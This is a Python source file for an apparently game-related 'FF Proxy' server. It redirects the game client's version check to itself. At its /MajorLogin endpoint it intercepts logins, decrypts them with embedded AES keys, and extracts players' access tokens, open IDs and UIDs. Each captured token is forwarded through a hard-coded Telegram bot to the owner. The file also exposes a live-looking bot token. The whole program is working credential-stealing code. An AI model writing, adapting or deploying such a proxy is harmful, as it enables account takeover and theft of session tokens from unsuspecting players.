#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FF Proxy Server - Fixed Version
Handles both ver.php and MajorLogin properly
"""

import httpx
import uvicorn
import json
import os
import logging
import time
import threading
import base64
from fastapi import FastAPI, Request, Response
from fastapi.responses import Response as FastAPIResponse, JSONResponse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ══════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

# AES Keys (same as game)
Key = b'Yg&tc%DEuh6%Zc^8'
Iv = b'6oyZDr22E3ychjM%'

# Telegram Bot
BOT_TOKEN = "8627834434:AAEv5FA25Pd7DHkzISDX1fOcP4RHSrGIHik"
OWNER_IDS = [8078228501]
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

# Token Storage
TOKEN_DB = []

# ══════════════════════════════════════════════════════
# TELEGRAM BOT HANDLERS
# ══════════════════════════════════════════════════════
def is_owner(user_id):
    return user_id in OWNER_IDS

@bot.message_handler(commands=['start'])
def start_cmd(message):
    if not is_owner(message.chat.id):
        bot.reply_to(message, "❌ Access Denied!")
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("📊 View Tokens", callback_data="view_tokens"),
        InlineKeyboardButton("🗑 Clear Tokens", callback_data="clear_tokens")
    )
    markup.add(
        InlineKeyboardButton("📈 Stats", callback_data="stats"),
        InlineKeyboardButton("🔄 Refresh", callback_data="refresh")
    )
    
    bot.send_message(
        message.chat.id,
        f"""
🔐 *FF Proxy Bot v2.0*

Welcome Owner! 👑

▸ Bot Status: ✅ Online
▸ Proxy: Active
▸ Tokens Captured: *{len(TOKEN_DB)}*

━━━━━━━━━━━━━━━
@BBYTOP3 | FF Proxy
        """,
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    if not is_owner(call.message.chat.id):
        bot.answer_callback_query(call.id, "❌ Access Denied!", show_alert=True)
        return
    
    if call.data == "view_tokens":
        if not TOKEN_DB:
            bot.send_message(call.message.chat.id, "📭 No tokens captured yet!")
        else:
            for token_data in TOKEN_DB[-5:]:
                text = f"""
🔑 *Token #{token_data.get('id', 'N/A')}*

▸ Access Token:
`{token_data['token'][:50]}...`

▸ Open ID:
`{token_data['open_id'][:50]}...`

▸ UID: `{token_data.get('uid', 'N/A')}`
▸ Time: {token_data['time']}
"""
                bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "✅ Tokens sent!")
    
    elif call.data == "clear_tokens":
        count = len(TOKEN_DB)
        TOKEN_DB.clear()
        bot.send_message(call.message.chat.id, f"✅ Cleared {count} tokens!")
        bot.answer_callback_query(call.id, "🗑 Tokens cleared!")
    
    elif call.data == "stats":
        text = f"""
📊 *Proxy Stats*

▸ Total Tokens: *{len(TOKEN_DB)}*
▸ Uptime: Active
▸ Server: Cloud Render
▸ Version: v2.0

━━━━━━━━━━━━━━━
@BBYTOP3
"""
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
        bot.answer_callback_query(call.id, "📊 Stats loaded!")
    
    elif call.data == "refresh":
        bot.edit_message_text(
            f"🔐 *FF Proxy Bot v2.0*\n\n✅ Online | Tokens: *{len(TOKEN_DB)}*",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown",
            reply_markup=call.message.reply_markup
        )
        bot.answer_callback_query(call.id, "🔄 Refreshed!")

# ══════════════════════════════════════════════════════
# SEND TOKEN TO OWNER
# ══════════════════════════════════════════════════════
def send_token_to_owner(access_token, open_id, uid):
    text = f"""
🔑 *New Token Captured!*

▸ Access Token:
`{access_token}`

▸ Open ID:
`{open_id}`

▸ UID: `{uid}`
▸ Time: {time.strftime("%Y-%m-%d %H:%M:%S")}

━━━━━━━━━━━━━━━
@BBYTOP3 | FF Proxy v2.0
"""
    for owner_id in OWNER_IDS:
        try:
            bot.send_message(owner_id, text, parse_mode="Markdown")
            logger.info(f"✅ Token sent to owner {owner_id}")
        except Exception as e:
            logger.error(f"❌ Failed to send to {owner_id}: {e}")

# ══════════════════════════════════════════════════════
# AES HELPERS (FIXED)
# ══════════════════════════════════════════════════════
def EnC_AEs(HeX):
    try:
        if isinstance(HeX, str):
            HeX = bytes.fromhex(HeX)
        cipher = AES.new(Key, AES.MODE_CBC, Iv)
        return cipher.encrypt(pad(HeX, AES.block_size)).hex()
    except Exception as e:
        logger.error(f"Encrypt error: {e}")
        return ""

def DEc_AEs(HeX):
    try:
        if isinstance(HeX, str):
            HeX = bytes.fromhex(HeX)
        cipher = AES.new(Key, AES.MODE_CBC, Iv)
        return unpad(cipher.decrypt(HeX), AES.block_size).hex()
    except Exception as e:
        logger.error(f"Decrypt error: {e}")
        return ""

# ══════════════════════════════════════════════════════
# X7M DECRYPT (Using your x7m module)
# ══════════════════════════════════════════════════════
def decrypt_api(hex_data):
    """Decrypt using x7m module - fallback if available"""
    try:
        from x7m import decrypt_api as x7m_decrypt
        return x7m_decrypt(hex_data)
    except ImportError:
        # Fallback: simple hex decode
        logger.warning("x7m module not found, using fallback")
        return bytes.fromhex(hex_data).decode('utf-8', errors='ignore')

def get_available_room(data):
    """Extract JSON from x7m response"""
    try:
        from x7m import get_available_room as x7m_room
        return x7m_room(data)
    except ImportError:
        return data

# ══════════════════════════════════════════════════════
# VERSION PROXY (FIXED)
# ══════════════════════════════════════════════════════
@app.api_route("/ver.php", methods=["GET", "POST", "HEAD"])
async def version_proxy(request: Request):
    target = "https://version.ggwhitehawk.com/live/ver.php"
    
    # Forward all headers except host
    headers = {}
    for k, v in request.headers.items():
        k_lower = k.lower()
        if k_lower not in ("host", "content-length", "connection", "accept-encoding"):
            headers[k] = v
    
    try:
        body = await request.body()
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=15.0) as client:
            r = await client.request(
                method=request.method,
                url=target,
                params=dict(request.query_params),
                headers=headers,
                content=body
            )
        
        # Get host from request
        host = request.headers.get("host", "localhost:6677")
        scheme = "https" if "onrender.com" in host or "render" in host else "http"
        
        # Parse response
        try:
            data = r.json()
            if isinstance(data, dict):
                # Add our proxy URL
                data["server_url"] = f"{scheme}://{host}/"
                data["proxy_status"] = "active"
                data["proxy_version"] = "2.0"
        except:
            data = {"status": "ok", "server_url": f"{scheme}://{host}/"}
        
        # Build response
        response_headers = {}
        for k, v in r.headers.items():
            k_lower = k.lower()
            if k_lower not in ("transfer-encoding", "connection", "keep-alive", 
                             "content-length", "content-encoding", "host"):
                response_headers[k] = v
        
        return JSONResponse(
            content=data,
            status_code=r.status_code,
            headers=response_headers
        )
    
    except httpx.TimeoutException:
        logger.error("Version proxy timeout")
        return JSONResponse(
            content={"status": "error", "message": "Timeout"},
            status_code=504
        )
    except Exception as e:
        logger.error(f"Version proxy error: {e}")
        return JSONResponse(
            content={"status": "error", "message": str(e)},
            status_code=502
        )

# ══════════════════════════════════════════════════════
# LOGIN INTERCEPTOR (FIXED)
# ══════════════════════════════════════════════════════
@app.api_route("/MajorLogin", methods=["POST", "GET"])
async def login_interceptor(request: Request):
    try:
        body = await request.body()
        logger.info(f"📱 Login request | Size: {len(body)} bytes")
        
        # Try to decrypt
        try:
            hex_data = body.hex()
            decrypted = decrypt_api(hex_data)
            logger.info(f"Decrypted: {decrypted[:200]}...")
            
            # Parse JSON
            x7m = json.loads(get_available_room(decrypted))
            logger.info(f"Parsed: {json.dumps(x7m, indent=2)[:500]}")
            
            # Extract data
            access_token = x7m.get("29", x7m.get("access_token", "N/A"))
            open_id = x7m.get("22", x7m.get("open_id", "N/A"))
            uid = x7m.get("uid", x7m.get("player_id", x7m.get("11", "N/A")))
            
        except Exception as e:
            logger.error(f"Decrypt/Parse error: {e}")
            # Try raw JSON
            try:
                x7m = json.loads(body.decode('utf-8', errors='ignore'))
                access_token = x7m.get("29", x7m.get("access_token", "N/A"))
                open_id = x7m.get("22", x7m.get("open_id", "N/A"))
                uid = x7m.get("uid", x7m.get("player_id", "N/A"))
            except:
                access_token = "N/A"
                open_id = "N/A"
                uid = "N/A"

        # Store token
        token_entry = {
            "id": len(TOKEN_DB) + 1,
            "token": access_token,
            "open_id": open_id,
            "uid": uid,
            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "raw": body.hex()[:100] + "..."
        }
        TOKEN_DB.append(token_entry)
        logger.info(f"✅ Token #{token_entry['id']} captured!")
        
        # Send to owner
        if access_token != "N/A":
            threading.Thread(
                target=send_token_to_owner,
                args=(access_token, open_id, uid),
                daemon=True
            ).start()
        
        # Return success response that game expects
        response_data = {
            "code": 0,
            "msg": "success",
            "data": {
                "access_token": access_token,
                "open_id": open_id,
                "uid": uid,
                "server_url": f"http://{request.headers.get('host', 'localhost')}/"
            }
        }
        
        # Game expects specific format - return as encrypted or plain JSON
        return JSONResponse(
            content=response_data,
            status_code=200,
            headers={
                "Content-Type": "application/json",
                "Access-Control-Allow-Origin": "*"
            }
        )
        
    except Exception as e:
        logger.error(f"❌ Login failed: {e}")
        return JSONResponse(
            content={"code": -1, "msg": str(e)},
            status_code=500
        )

# ══════════════════════════════════════════════════════
# FALLBACK ROUTES
# ══════════════════════════════════════════════════════
@app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "HEAD"])
async def fallback(request: Request, path: str):
    """Catch-all for other requests"""
    logger.info(f"Fallback: {path} | Method: {request.method}")
    return JSONResponse(
        content={"status": "ok", "path": path},
        status_code=200
    )

# ══════════════════════════════════════════════════════
# HEALTH CHECK
# ══════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "status": "alive",
        "tokens": len(TOKEN_DB),
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "proxy_version": "2.0",
        "server": "FF Proxy"
    }

@app.get("/health")
async def health():
    return {"status": "healthy", "tokens": len(TOKEN_DB)}

# ══════════════════════════════════════════════════════
# STARTUP
# ══════════════════════════════════════════════════════
def run_bot():
    while True:
        try:
            logger.info("🤖 Bot polling started...")
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(5)

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    port = int(os.environ.get('PORT', 6677))
    logger.info(f"🚀 FF Proxy starting on port {port}")
    uvicorn.run(app, host='0.0.0.0', port=port, log_level='info')
